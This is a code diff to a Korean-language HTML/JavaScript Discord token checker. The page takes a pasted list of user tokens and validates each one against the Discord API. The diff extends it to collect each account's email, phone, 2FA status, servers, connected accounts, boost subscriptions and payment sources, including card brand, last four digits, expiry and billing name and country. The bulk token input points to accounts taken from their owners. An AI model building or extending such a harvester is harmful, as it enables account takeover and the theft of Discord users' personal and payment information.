@@ -7,7 +7,7 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Pretendard',sans-serif;background:linear-gradient(135deg,#0f0f14,#1a1b21);min-height:100vh;padding:24px 16px;color:#fff}
-.box{max-width:900px;margin:0 auto;background:#232428;border:1px solid #3a3c42;border-radius:16px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.box{max-width:980px;margin:0 auto;background:#232428;border:1px solid #3a3c42;border-radius:16px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
 h1{font-size:22px;font-weight:800;margin-bottom:4px}
 .sub{color:#a3a6ad;font-size:13px;margin-bottom:16px}
 .warn{background:rgba(237,66,69,.1);border-left:4px solid #ed4245;padding:10px 14px;border-radius:8px;font-size:12px;color:#f2b8b9;margin-bottom:16px}
@@ -66,6 +66,8 @@ button:disabled{opacity:.45;cursor:not-allowed}
 .bdg.nitro{background:linear-gradient(135deg,#ff73fa,#a56bff)}
 .bdg.staff{background:#ed4245}
 .bdg.early{background:#f0b232;color:#000}
+.bdg.partner{background:#5865F2}
+.bdg.dev{background:#23a55a}
 .si{font-size:19px;flex-shrink:0}
 .spin{width:18px;height:18px;border:2.5px solid #3f4147;border-top-color:#5865F2;border-radius:50%;animation:sp .7s linear infinite;flex-shrink:0}
 @keyframes sp{to{transform:rotate(360deg)}}
@@ -76,13 +78,16 @@ button:disabled{opacity:.45;cursor:not-allowed}
 .detail{margin-top:12px;padding-top:12px;border-top:1px dashed #3a3c42;display:none}
 .detail.on{display:block}
 .dgrid{display:grid;grid-template-columns:1fr;gap:6px}
-.drow{display:grid;grid-template-columns:130px 1fr;gap:10px;font-size:12.5px;padding:6px 10px;background:#16171b;border-radius:6px;align-items:start}
+.drow{display:grid;grid-template-columns:150px 1fr;gap:10px;font-size:12.5px;padding:6px 10px;background:#16171b;border-radius:6px;align-items:start}
 .drow .k{color:#8a8d94;font-weight:600;font-size:11.5px;text-transform:uppercase;letter-spacing:.3px}
 .drow .v{color:#e8e9ec;font-family:Consolas,monospace;word-break:break-all;line-height:1.5}
+.drow .v a{color:#5865F2;text-decoration:none}
+.drow .v a:hover{text-decoration:underline}
 .drow .v .hl{color:#5865F2;font-weight:700}
 .drow .v .ok{color:#23a55a;font-weight:700}
 .drow .v .no{color:#ed4245;font-weight:700}
 .drow .v .ni{background:linear-gradient(90deg,#ff73fa,#a56bff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700}
+.banner-prev{max-width:100%;max-height:100px;border-radius:6px;margin-top:6px;display:block}
 #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#232428;border:1px solid #3a3c42;color:#fff;padding:11px 20px;border-radius:10px;font-size:13px;font-weight:600;box-shadow:0 10px 30px rgba(0,0,0,.5);opacity:0;transition:.3s;z-index:9999;pointer-events:none}
 #toast.on{opacity:1;transform:translateX(-50%) translateY(0)}
 #toast.ok{border-color:rgba(35,165,90,.6)}
@@ -140,7 +145,7 @@ button:disabled{opacity:.45;cursor:not-allowed}
   function mask(t){return t.length<=24?t:t.slice(0,14)+'••••'+t.slice(-8)}
   function toast(m,type){tst.textContent=m;tst.className='on '+(type||'ok');clearTimeout(toast._t);toast._t=setTimeout(function(){tst.className=''},2200)}
 
-  // ID → 생성시간 (Snowflake)
+  // Snowflake → Date
   function snowflakeToDate(id){
     try{
       var ts=(BigInt(id)>>22n)+1420070400000n;
@@ -163,12 +168,11 @@ button:disabled{opacity:.45;cursor:not-allowed}
     return Math.floor(s/31536000)+'년 전';
   }
 
-  // Nitro 타입
   function nitroType(t){
     var m={0:'없음',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'};
     return m[t]||('알 수 없음 ('+t+')');
   }
-  // 인증 배지
+  // 상세 public_flags 배지
   function badgeFlags(f){
     if(!f)return[];
     var b=[];
@@ -180,13 +184,17 @@ button:disabled{opacity:.45;cursor:not-allowed}
     if(f&128)b.push('HypeSquad Brilliance');
     if(f&256)b.push('HypeSquad Balance');
     if(f&512)b.push('Early Supporter');
+    if(f&1024)b.push('Team User');
+    if(f&2048)b.push('System');
+    if(f&4096)b.push('Bug Hunter Lv2 (legacy)');
     if(f&16384)b.push('Bug Hunter Lv2');
-    if(f&131072)b.push('Early Verified Bot Dev');
-    if(f&262144)b.push('Certified Moderator');
+    if(f&32768)b.push('Verified Bot');
+    if(f&65536)b.push('Early Verified Bot Dev');
+    if(f&131072)b.push('Certified Moderator');
+    if(f&262144)b.push('Bot HTTP Interactions');
     if(f&4194304)b.push('Active Developer');
     return b;
   }
-  // 유저 플래그 (프로필 배지)
   function userFlags(p){
     if(!p)return[];
     var b=[];
@@ -199,6 +207,11 @@ button:disabled{opacity:.45;cursor:not-allowed}
     if(p.active_developer)b.push('Active Dev');
     if(p.early_verified_bot_developer)b.push('Early Bot Dev');
     return b;
+  }
+  function premiumGuildSince(v){
+    if(v==null)return null;
+    // ms timestamp
+    try{return new Date(Number(v))}catch(e){return null}
   }
 
   function upStat(){
@@ -222,7 +235,6 @@ button:disabled{opacity:.45;cursor:not-allowed}
     return d;
   }
 
-  // 상세정보 HTML 생성
   function buildDetail(u,extra){
     extra=extra||{};
     var created=snowflakeToDate(u.id);
@@ -230,30 +242,108 @@ button:disabled{opacity:.45;cursor:not-allowed}
     var uf=userFlags(u.user_flags);
     var rows=[];
 
+    // === 기본 계정 ===
     rows.push(['User ID', '<span class="hl">'+esc(u.id)+'</span>']);
     rows.push(['Username', esc(u.username)]);
     rows.push(['Display Name', esc(u.global_name||u.username)]);
     rows.push(['Discriminator', u.discriminator&&u.discriminator!=='0'?'#'+esc(u.discriminator):'<span style="color:#8a8d94">(신규 시스템)</span>']);
     rows.push(['Account Type', u.bot?'🤖 Bot':'👤 User']);
+    rows.push(['Account Created', '<span class="hl">'+fmtDate(created)+'</span> <span style="color:#8a8d94">('+timeAgo(created)+')</span>']);
+
+    // === 연락/보안 ===
     rows.push(['Email', u.email?esc(u.email):'<span class="no">없음</span>']);
     rows.push(['Email Verified', u.verified?'<span class="ok">✅ 인증됨</span>':'<span class="no">❌ 미인증</span>']);
     rows.push(['Phone', u.phone?esc(u.phone):'<span style="color:#8a8d94">없음</span>']);
     rows.push(['2FA Enabled', u.mfa_enabled?'<span class="ok">🔐 활성화</span>':'<span style="color:#8a8d94">비활성</span>']);
+
+    // === Nitro / 결제 ===
     rows.push(['Nitro', u.premium_type?'<span class="ni">✨ '+nitroType(u.premium_type)+'</span>':'<span style="color:#8a8d94">없음</span>']);
-    if(u.premium_type)rows.push(['Nitro Since', u.premium_since?fmtDate(new Date(u.premium_since)):'N/A']);
+    if(u.premium_type){
+      rows.push(['Nitro Since', u.premium_since?fmtDate(new Date(u.premium_since)):'N/A']);
+    }
+
+    // === 로케일/설정 ===
     rows.push(['Locale', esc(u.locale||'N/A')]);
     rows.push(['NSFW Allowed', u.nsfw_allowed?'✅ 허용':'❌ 차단']);
-    rows.push(['Account Created', '<span class="hl">'+fmtDate(created)+'</span> <span style="color:#8a8d94">('+timeAgo(created)+')</span>']);
-    rows.push(['Avatar Hash', u.avatar?esc(u.avatar):'<span style="color:#8a8d94">기본 아바타</span>']);
-    if(u.banner)rows.push(['Banner Hash', esc(u.banner)]);
-    rows.push(['Accent Color', u.accent_color!=null?'#'+u.accent_color.toString(16).padStart(6,'0'):'N/A']);
+
+    // === 프로필 외형 ===
+    if(u.avatar){
+      var avurl='https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+(u.avatar.indexOf('a_')===0?'.gif':'.png')+'?size=256';
+      rows.push(['Avatar Hash', esc(u.avatar)]);
+      rows.push(['Avatar URL', '<a href="'+avurl+'" target="_blank" rel="noopener">'+esc(avurl)+'</a>']);
+    }else{
+      rows.push(['Avatar Hash', '<span style="color:#8a8d94">기본 아바타</span>']);
+    }
+
+    // 프로필 배너 (user_profile.banner 우선, 없으면 u.banner)
+    var bannerHash = (extra.profile_banner!=null?extra.profile_banner:u.banner);
+    if(bannerHash){
+      var isAnimated = bannerHash.indexOf('a_')===0;
+      var burl='https://cdn.discordapp.com/banners/'+u.id+'/'+bannerHash+(isAnimated?'.gif':'.png')+'?size=600';
+      rows.push(['Profile Banner', '<a href="'+burl+'" target="_blank" rel="noopener">'+esc(burl)+'</a><br><img class="banner-prev" src="'+burl+'" alt="banner">']);
+    }else{
+      rows.push(['Profile Banner', '<span style="color:#8a8d94">없음</span>']);
+    }
+
+    // 아바타 데코레이션
+    if(u.avatar_decoration_data){
+      var ad=u.avatar_decoration_data;
+      var adurl='https://cdn.discordapp.com/avatar-decoration-presets/'+ad.asset+'.png';
+      rows.push(['Avatar Decoration', esc(ad.sku_id||'')+'<br><a href="'+adurl+'" target="_blank" rel="noopener">'+esc(adurl)+'</a>']);
+    }
+
+    var accent = (extra.accent_color!=null?extra.accent_color:u.accent_color);
+    rows.push(['Accent Color', accent!=null?'#'+accent.toString(16).padStart(6,'0'):'N/A']);
+
+    // === Bio / Pronouns / 상태메시지 ===
+    if(extra.bio!=null)rows.push(['소개글 (Bio)', extra.bio?esc(extra.bio):'<span style="color:#8a8d94">없음</span>']);
+    if(extra.pronouns!=null)rows.push(['대명사 (Pronouns)', extra.pronouns?esc(extra.pronouns):'<span style="color:#8a8d94">없음</span>']);
+    if(extra.custom_status){
+      var cs=extra.custom_status;
+      var emojiTxt = cs.emoji? (cs.emoji.id? '<img src="https://cdn.discordapp.com/emojis/'+cs.emoji.id+'.'+(cs.emoji.animated?'gif':'png')+'" style="height:16px;vertical-align:middle">' : esc(cs.emoji.name)) : '';
+      rows.push(['상태 메시지', emojiTxt+' '+esc(cs.text||'')]);
+    }
+
+    // === 서버 ===
+    if(extra.guild_count!=null){
+      rows.push(['서버 개수', '<span class="hl">'+extra.guild_count+'개</span>']);
+    }
+    if(extra.guilds && extra.guilds.length){
+      rows.push(['주요 서버 (10)', extra.guilds.map(function(g){
+        return esc(g.name)+(g.owner?' <span class="ok">(👑 소유)</span>':'');
+      }).join('<br>')]);
+    }
+
+    // === 연결 계정 ===
+    if(extra.connected&&extra.connected.length){
+      rows.push(['연결된 계정', extra.connected.map(function(c){
+        return esc(c.type)+': '+esc(c.name)+(c.verified?' <span class="ok">✅</span>':' <span class="no">미인증</span>');
+      }).join('<br>')]);
+    }
+
+    // === 결제수단 ===
+    if(extra.billing&&extra.billing.length){
+      extra.billing.forEach(function(b,i){
+        var parts=[];
+        parts.push(b.type);
+        if(b.brand)parts.push(b.brand.toUpperCase());
+        if(b.last4)parts.push('****'+b.last4);
+        if(b.exp)parts.push('exp '+b.exp);
+        var line=parts.join(' · ');
+        var addr='';
+        if(b.name||b.country)addr='<br><span style="color:#8a8d94">'+esc(b.name||'')+(b.country?' · '+esc(b.country):'')+'</span>';
+        rows.push(['결제수단 '+(i+1), line+addr]);
+      });
+    }
+
+    // === 배지 ===
     rows.push(['Public Flags', flags.length?'<span class="hl">'+flags.join(', ')+'</span>':'<span style="color:#8a8d94">없음</span>']);
     rows.push(['Profile Badges', uf.length?uf.join(', '):'<span style="color:#8a8d94">없음</span>']);
 
-    // 상세 프로필 (bio, pronouns 등) - 별도 요청 결과
-    if(extra.bio!=null)rows.push(['소개글 (Bio)', extra.bio?esc(extra.bio):'<span style="color:#8a8d94">없음</span>']);
-    if(extra.pronouns!=null)rows.push(['대명사 (Pronouns)', extra.pronouns?esc(extra.pronouns):'<span style="color:#8a8d94">없음</span>']);
-    if(extra.connected&&extra.connected.length)rows.push(['연결된 계정', extra.connected.map(function(c){return c.type+': '+c.name}).join('<br>')]);
+    // === 불가능 안내 ===
+    rows.push(['친구 개수', '<span style="color:#8a8d94">API 미제공 (Gateway 전용)</span>']);
+    rows.push(['실시간 상태', '<span style="color:#8a8d94">API 미제공</span>']);
+    rows.push(['계정 생성 국가', '<span style="color:#8a8d94">API 미제공 (청구지로 추정)</span>']);
 
     var html='<div class="dgrid">';
     rows.forEach(function(r){
@@ -272,7 +362,9 @@ button:disabled{opacity:.45;cursor:not-allowed}
     if(u.bot)bdg+='<span class="bdg bot">BOT</span>';
     if(u.premium_type)bdg+='<span class="bdg nitro">NITRO</span>';
     if(u.public_flags&&(u.public_flags&1))bdg+='<span class="bdg staff">STAFF</span>';
+    if(u.public_flags&&(u.public_flags&2))bdg+='<span class="bdg partner">PARTNER</span>';
     if(u.public_flags&&(u.public_flags&512))bdg+='<span class="bdg early">EARLY</span>';
+    if(u.public_flags&&(u.public_flags&4194304))bdg+='<span class="bdg dev">DEV</span>';
 
     var created=snowflakeToDate(u.id);
 
@@ -309,47 +401,97 @@ button:disabled{opacity:.45;cursor:not-allowed}
       '<div class="dt">'+esc(mask(tok))+' · '+esc(why)+'</div></div><div class="si">❌</div></div>';
   }
 
-  // 상세 프로필 (bio, pronouns, connected accounts) 별도 요청
+  // === 확장 정보 수집 ===
   async function fetchExtra(tok){
     var extra={};
+
+    // 1) 프로필 (bio, pronouns, connected, banner, accent, custom status)
     try{
-      var r=await fetch(API+'/users/@me/profile',{
-        headers:{'Authorization':tok},
-        cache:'no-store'
-      });
+      var r=await fetch(API+'/users/@me/profile',{headers:{'Authorization':tok},cache:'no-store'});
       if(r.status===200){
         var d=await r.json();
-        if(d.user_profile){
-          extra.bio=d.user_profile.bio||'';
-          extra.pronouns=d.user_profile.pronouns||'';
-          if(d.user_profile.connected_accounts){
-            extra.connected=d.user_profile.connected_accounts.map(function(c){
-              return {type:c.type,name:c.name||c.id};
-            });
-          }
+        var p=d.user_profile||{};
+        extra.bio = p.bio!=null ? p.bio : '';
+        extra.pronouns = p.pronouns!=null ? p.pronouns : '';
+        if(p.premium_since)extra.premium_since=p.premium_since;
+        if(p.banner!=null)extra.profile_banner=p.banner;
+        if(p.accent_color!=null)extra.accent_color=p.accent_color;
+        if(p.emoji)extra.status_emoji=p.emoji;
+        if(p.connected_accounts&&p.connected_accounts.length){
+          extra.connected=p.connected_accounts.map(function(c){
+            return {type:c.type,name:c.name||c.id,verified:c.verified};
+          });
         }
       }
     }catch(e){}
-    // 폴백: /users/@me 에는 bio 없음. bio 비어있으면 user_profile에서 한 번 더 시도
-    if(extra.bio==null){
+
+    // 2) 커스텀 상태 (settings)
+    try{
+      var s=await fetch(API+'/users/@me/settings',{headers:{'Authorization':tok},cache:'no-store'});
+      if(s.status===200){
+        var sd=await s.json();
+        if(sd.custom_status&&(sd.custom_status.text||sd.custom_status.emoji)){
+          extra.custom_status=sd.custom_status;
+        }
+        if(sd.status)extra.online_status=sd.status;
+      }
+    }catch(e){}
+
+    // 3) 서버 개수 + 목록
+    try{
+      var g=await fetch(API+'/users/@me/guilds',{headers:{'Authorization':tok},cache:'no-store'});
+      if(g.status===200){
+        var gs=await g.json();
+        extra.guild_count=gs.length;
+        extra.guilds=gs.slice(0,10).map(function(x){return {name:x.name,owner:x.owner}});
+      }
+    }catch(e){}
+
+    // 4) 연결 계정 (폴백)
+    if(!extra.connected){
       try{
-        var r2=await fetch(API+'/users/@me',{
-          headers:{'Authorization':tok},
-          cache:'no-store'
-        });
-        // 일부 응답에 user_profile 필드가 함께 오는 경우
-        if(r2.status===200){
-          var d2=await r2.json();
-          if(d2.user_profile){
-            extra.bio=d2.user_profile.bio||'';
-            extra.pronouns=d2.user_profile.pronouns||'';
-          }
+        var c=await fetch(API+'/users/@me/connections',{headers:{'Authorization':tok},cache:'no-store'});
+        if(c.status===200){
+          var cs=await c.json();
+          extra.connected=cs.map(function(x){return {type:x.type,name:x.name||x.id,verified:x.verified}});
         }
       }catch(e){}
     }
+
+        // 5) 결제수단
+    try{
+      var b=await fetch(API+'/users/@me/billing/payment-sources',{headers:{'Authorization':tok},cache:'no-store'});
+      if(b.status===200){
+        var bs=await b.json();
+        extra.billing=bs.map(function(x){
+          return {
+            type: x.type===1?'카드':x.type===2?'PayPal':'기타',
+            brand: x.brand||'',
+            last4: x.last_4||'',
+            exp: x.expires_month? (x.expires_month+'/'+x.expires_year) : '',
+            country: x.billing_address? x.billing_address.country : '',
+            name: x.billing_address? x.billing_address.name : ''
+          };
+        });
+      }
+    }catch(e){}
+
+    // 6) 프리미엄 길드 구독 (부스트 슬롯)
+    try{
+      var pg=await fetch(API+'/users/@me/guilds/premium-subscriptions',{headers:{'Authorization':tok},cache:'no-store'});
+      if(pg.status===200){
+        var pgs=await pg.json();
+        if(pgs&&pgs.length){
+          extra.boost_slots=pgs.length;
+          extra.boost_guilds=pgs.slice(0,10).map(function(x){return x.guild_id});
+        }
+      }
+    }catch(e){}
+
     return extra;
   }
 
+  // === 토큰 하나 검사 ===
   async function check(tok,el){
     try{
       var r=await fetch(API+'/users/@me',{
@@ -389,6 +531,7 @@ button:disabled{opacity:.45;cursor:not-allowed}
     upStat();
   }
 
+  // === 전체 실행 ===
   async function start(){
     if(busy)return;
     var raw=inp.value.split('\n').map(function(t){return t.trim()}).filter(function(t){return t});
